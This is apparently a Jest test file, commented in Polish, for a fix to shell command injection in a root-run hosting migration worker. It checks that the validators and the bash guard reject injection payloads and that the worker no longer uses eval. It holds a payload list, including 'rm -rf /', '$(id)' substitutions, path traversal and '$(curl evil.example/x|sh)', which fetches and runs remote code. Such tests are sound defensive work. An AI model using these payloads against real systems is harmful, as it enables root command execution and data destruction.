import { execFileSync } from 'child_process';
import { copyFileSync, existsSync, mkdtempSync, readFileSync } from 'fs';
import { tmpdir } from 'os';
import { join, resolve } from 'path';
import { plainToInstance } from 'class-transformer';
import { validateSync } from 'class-validator';
import {
  CreateMigrationBundleDto,
  DiscoverMigrationSourceDto,
  MigrationFtpSourceDto,
  MigrationImapSourceDto,
  MigrationMysqlSourceDto,
  RequestExternalMigrationDto,
} from './dto/migration.dto';

/**
 * Z-03 — wstrzyknięcie polecenia powłoki przez formularz migracji.
 *
 * Zlecenie migracji wykonuje `ops/scripts/node-migration-worker.sh` jako root,
 * na węźle hostującym konta innych klientów. Przed poprawką:
 *
 *   eval "$mysql_cmd -N -e \"... table_schema='${db}' ...\""   # nazwa bazy
 *   lftp -e "... mirror ... '${spath}' '${dst}'; bye"          # ścieżka zdalna
 *
 * a DTO sprawdzało wyłącznie długość. Nazwa bazy `x'; touch /tmp/pwned; #`
 * albo ścieżka z apostrofem dawały wykonanie dowolnego polecenia jako root.
 *
 * Testy pilnują trzech rzeczy:
 *  1. DTO odrzuca ładunki i przepuszcza realne dane,
 *  2. warstwa w skrypcie (`lib/migration-input-guard.sh`) wydaje TE SAME
 *     werdykty — inaczej jedna z warstw zacznie kiedyś kłamać,
 *  3. w workerze nie ma już `eval` wykonującego interpolowane dane, a brak
 *     biblioteki walidacji zatrzymuje worker (fail-closed).
 */

const KORZEN = resolve(__dirname, '../../../..');
const GUARD = resolve(KORZEN, 'ops/scripts/lib/migration-input-guard.sh');
const WORKER = resolve(KORZEN, 'ops/scripts/node-migration-worker.sh');

/** Ładunki, na których stary kod dawał wykonanie polecenia jako root. */
const LADUNKI = [
  `x'; touch /tmp/pwned; #`,
  'baza; rm -rf /',
  'baza`id`',
  'baza$(id)',
  'baza|id',
  'baza\ndrugalinia',
  "sciezka'z-apostrofem",
  '/home/klient/"cudzyslow"',
  '/home/klient/../../etc',
  '$(curl evil.example/x|sh)',
];

const POPRAWNE = {
  host: ['przyklad.pl', 'ftp.stary-hosting.com.pl', '192.0.2.10', 'serwer123.home.pl'],
  username: ['klient1', 'user_2', 'jan.kowalski', 'konto@przyklad.pl', 'a+b'],
  database: ['wp_baza', 'klient1_shop', 'baza-2024', 'DB$1'],
  path: ['/', '/home/klient/public_html', '/domains/przyklad.pl/public_html', 'katalog z spacja'],
  email: ['jan@przyklad.pl', 'biuro+kontakt@firma.com.pl'],
};

function bledy(dto: object, pole: string) {
  return validateSync(dto as never, { whitelist: false }).filter((e) => e.property === pole);
}

const ftp = (nadpisz: Partial<MigrationFtpSourceDto>) =>
  plainToInstance(MigrationFtpSourceDto, {
    host: 'przyklad.pl',
    port: 22,
    username: 'klient1',
    password: 'cokolwiek',
    ...nadpisz,
  });

const mysql = (nadpisz: Partial<MigrationMysqlSourceDto>) =>
  plainToInstance(MigrationMysqlSourceDto, {
    host: 'przyklad.pl',
    port: 3306,
    username: 'klient1',
    password: 'cokolwiek',
    database: 'wp_baza',
    ...nadpisz,
  });

describe('Z-03 — walidacja danych migracji (warstwa DTO)', () => {
  describe('nazwa bazy', () => {
    it.each(LADUNKI)('odrzuca ładunek: %j', (ladunek) => {
      expect(bledy(mysql({ database: ladunek }), 'database')).not.toHaveLength(0);
    });

    it.each(POPRAWNE.database)('przepuszcza realną nazwę: %s', (wartosc) => {
      expect(bledy(mysql({ database: wartosc }), 'database')).toHaveLength(0);
    });
  });

  describe('ścieżka zdalna', () => {
    it.each(LADUNKI)('odrzuca ładunek: %j', (ladunek) => {
      expect(bledy(ftp({ remotePath: ladunek }), 'remotePath')).not.toHaveLength(0);
    });

    it.each(POPRAWNE.path)('przepuszcza realną ścieżkę: %s', (wartosc) => {
      expect(bledy(ftp({ remotePath: wartosc }), 'remotePath')).toHaveLength(0);
    });

    it('odrzuca wyjście w górę drzewa, nawet gdy same znaki są dozwolone', () => {
      expect(bledy(ftp({ remotePath: '/home/klient/../../root' }), 'remotePath')).not.toHaveLength(0);
    });
  });

  describe('host i login', () => {
    it.each(LADUNKI)('odrzuca ładunek w host: %j', (ladunek) => {
      expect(bledy(mysql({ host: ladunek }), 'host')).not.toHaveLength(0);
    });

    it.each(LADUNKI)('odrzuca ładunek w username: %j', (ladunek) => {
      expect(bledy(mysql({ username: ladunek }), 'username')).not.toHaveLength(0);
    });

    it.each(POPRAWNE.host)('przepuszcza realny host: %s', (wartosc) => {
      expect(bledy(mysql({ host: wartosc }), 'host')).toHaveLength(0);
    });

    it.each(POPRAWNE.username)('przepuszcza realny login: %s', (wartosc) => {
      expect(bledy(mysql({ username: wartosc }), 'username')).toHaveLength(0);
    });
  });

  it('hasło zostaje bez ograniczeń znaków — idzie do zmiennej środowiskowej, nie do polecenia', () => {
    expect(bledy(mysql({ password: `a'b"c;$(id)|\`x\`` }), 'password')).toHaveLength(0);
  });

  it('pilnuje wszystkich trzech bloków pakietu zleceń', () => {
    const dto = plainToInstance(CreateMigrationBundleDto, {
      ftp: { host: 'przyklad.pl', port: 22, username: 'k', password: 'p', remotePath: "/a'b" },
      mysql: [{ host: 'przyklad.pl', port: 3306, username: 'k', password: 'p', database: 'zla;baza' }],
      imap: [{ host: 'przyklad.pl', port: 993, username: 'k`id`', password: 'p' }],
    });
    const wynik = validateSync(dto);
    expect(wynik.map((e) => e.property).sort()).toEqual(['ftp', 'imap', 'mysql']);
  });

  it('stare ścieżki zleceń też są objęte (external, discovery, imap e-mail)', () => {
    expect(
      bledy(
        plainToInstance(RequestExternalMigrationDto, {
          sourceType: 'FTP',
          sourceHost: 'przyklad.pl',
          sourcePort: 21,
          sourceUsername: 'k',
          sourcePassword: 'p',
          sourcePath: "/a'b",
        }),
        'sourcePath',
      ),
    ).not.toHaveLength(0);

    expect(
      bledy(
        plainToInstance(DiscoverMigrationSourceDto, {
          host: 'przyklad.pl',
          username: 'zly;user',
          password: 'p',
        }),
        'username',
      ),
    ).not.toHaveLength(0);

    expect(
      bledy(
        plainToInstance(MigrationImapSourceDto, {
          host: 'przyklad.pl',
          port: 993,
          username: 'k',
          password: 'p',
          email: 'nie-email;id',
        }),
        'email',
      ),
    ).not.toHaveLength(0);
  });
});

describe('Z-03 — druga warstwa: guard po stronie węzła', () => {
  const dostepny = existsSync(GUARD);

  it('biblioteka walidacji istnieje w repozytorium', () => {
    expect(dostepny).toBe(true);
  });

  /** Zwraca true, gdy guard uznaje wartość za bezpieczną. */
  function guardPrzepuszcza(typ: string, wartosc: string): boolean {
    try {
      execFileSync('bash', [GUARD, 'check', typ, wartosc], { stdio: 'pipe' });
      return true;
    } catch {
      return false;
    }
  }

  const PARY: Array<[string, string, (v: string) => boolean]> = [
    ['db', 'database', (v) => bledy(mysql({ database: v }), 'database').length === 0],
    ['path', 'remotePath', (v) => bledy(ftp({ remotePath: v }), 'remotePath').length === 0],
    ['host', 'host', (v) => bledy(mysql({ host: v }), 'host').length === 0],
    ['username', 'username', (v) => bledy(mysql({ username: v }), 'username').length === 0],
  ];

  describe.each(PARY)('typ %s ↔ pole DTO %s', (typGuarda, _pole, dtoPrzepuszcza) => {
    const probki = [...LADUNKI, ...POPRAWNE.host, ...POPRAWNE.username, ...POPRAWNE.database, ...POPRAWNE.path];

    it('obie warstwy wydają ten sam werdykt dla każdej próbki', () => {
      const rozjazdy = probki
        .map((v) => ({ v, dto: dtoPrzepuszcza(v), guard: guardPrzepuszcza(typGuarda, v) }))
        .filter((r) => r.dto !== r.guard)
        .map((r) => `${JSON.stringify(r.v)}: DTO=${r.dto ? 'ok' : 'blok'}, guard=${r.guard ? 'ok' : 'blok'}`);
      expect(rozjazdy).toEqual([]);
    });
  });

  it('guard odrzuca ładunki, na których stary worker wykonywał polecenia', () => {
    for (const ladunek of LADUNKI) {
      expect(guardPrzepuszcza('db', ladunek)).toBe(false);
      expect(guardPrzepuszcza('path', ladunek)).toBe(false);
    }
  });
});

describe('Z-03 — worker migracji', () => {
  const zrodlo = readFileSync(WORKER, 'utf8');

  it('nie wykonuje już niczego przez eval', () => {
    // Komentarze opisujące dawny stan zostają — interesują nas linie wykonywalne.
    const linie = zrodlo
      .split('\n')
      .filter((l) => !l.trimStart().startsWith('#'))
      .filter((l) => /\beval\b/.test(l));
    expect(linie).toEqual([]);
  });

  it('startuje fail-closed, gdy brakuje biblioteki walidacji', () => {
    // Nie na tekście źródła, tylko na zachowaniu: kopiujemy sam worker do
    // pustego katalogu (bez lib/) i sprawdzamy, że kończy pracę kodem 78,
    // zanim dojdzie do pobrania jakiegokolwiek zlecenia.
    const katalog = mkdtempSync(join(tmpdir(), 'verris-worker-'));
    const kopia = join(katalog, 'node-migration-worker.sh');
    copyFileSync(WORKER, kopia);

    let kod: number | null = null;
    try {
      execFileSync('bash', [kopia, 'once'], { stdio: 'pipe', timeout: 20_000 });
      kod = 0;
    } catch (e) {
      kod = (e as { status?: number }).status ?? null;
    }

    // 78 = EX_CONFIG. Gdyby worker ruszył dalej, dostalibyśmy inny kod (brak
    // /etc/verris.conf) albo 0 — i to jest dokładnie sytuacja, przed którą
    // ten test broni: kontrola bezpieczeństwa znika razem z plikiem, a worker
    // dalej bierze zlecenia.
    expect(kod).toBe(78);
  });

  it('waliduje wejście w każdej z trzech ścieżek transferu', () => {
    for (const sekcja of ['run_files', 'run_mysql', 'run_imap']) {
      const start = zrodlo.indexOf(`${sekcja}() {`);
      expect(start).toBeGreaterThan(-1);
      const koniec = zrodlo.indexOf('\n}\n', start);
      expect(zrodlo.slice(start, koniec)).toContain('vg_');
    }
  });
});
